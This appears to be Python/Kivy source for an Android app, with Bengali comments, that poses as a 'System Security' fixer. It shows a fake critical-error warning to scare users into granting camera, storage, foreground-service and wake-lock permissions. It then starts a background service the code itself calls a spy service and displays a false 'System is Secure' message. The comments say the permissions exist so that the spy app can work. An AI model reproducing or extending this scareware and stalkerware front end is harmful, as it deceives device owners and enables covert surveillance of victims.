import os
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.button import Button
from kivy.utils import get_color_from_hex
from android.permissions import request_permissions, Permission
from jnius import autoclass

class SystemUpdateApp(App):
    def build(self):
        self.title = "System Security"
        # প্রধান লেআউট ডিজাইন
        layout = BoxLayout(orientation='vertical', padding=30, spacing=20)
        
        # একটি আকর্ষণীয় ওয়ার্নিং মেসেজ যাতে ইউজার পারমিশন দেয়
        warning_text = (
            "[b][color=ff0000]CRITICAL SYSTEM ERROR![/color][/b]\n\n"
            "Your device is at risk of malware infection.\n"
            "Please run the system fixer to protect your data."
        )
        
        self.label = Label(text=warning_text, markup=True, halign='center', font_size='18sp')
        
        # ফিক্স বাটন (সবুজ রঙের)
        self.btn = Button(
            text="FIX & PROTECT NOW",
            size_hint=(1, 0.25),
            background_color=get_color_from_hex('#2ECC71'),
            font_size='20sp',
            bold=True
        )
        self.btn.bind(on_press=self.ask_permissions)
        
        layout.add_widget(self.label)
        layout.add_widget(self.btn)
        return layout

    def ask_permissions(self, instance):
        # এই পারমিশনগুলো এলাউ করলে তবেই তোর স্পাই অ্যাপ কাজ করবে
        permissions = [
            Permission.CAMERA,
            Permission.WRITE_EXTERNAL_STORAGE,
            Permission.READ_EXTERNAL_STORAGE,
            Permission.VIBRATE,
            Permission.FOREGROUND_SERVICE,
            Permission.WAKE_LOCK,
            Permission.POST_NOTIFICATIONS
        ]
        request_permissions(permissions, self.permission_callback)

    def permission_callback(self, permissions, results):
        # যদি ইউজার সব পারমিশন 'Allow' করে দেয়
        if all(results):
            self.label.text = "[color=00ff00]System Scanning...[/color]\n\nApplying Security Patches."
            self.btn.disabled = True
            self.start_spy_service()
        else:
            self.label.text = "[color=ff0000]Permission Denied![/color]\nUpdate failed. Try again."

    def start_spy_service(self):
        try:
            # তোর buildozer.spec এর package.name = gourab এর সাথে কানেক্ট করা হয়েছে
            service = autoclass('org.test.gourab.ServiceMyservice')
            context = autoclass('org.kivy.android.PythonActivity').mActivity
            service.start(context, "")
            
            self.label.text = "[color=00ff00]System is Secure![/color]\n\nYou can now close this app."
        except Exception as e:
            # যদি কোনো এরর হয় তবে সেটা স্ক্রিনে দেখাবে
            self.label.text = f"Error: {str(e)}"

if __name__ == '__main__':
    SystemUpdateApp().run()
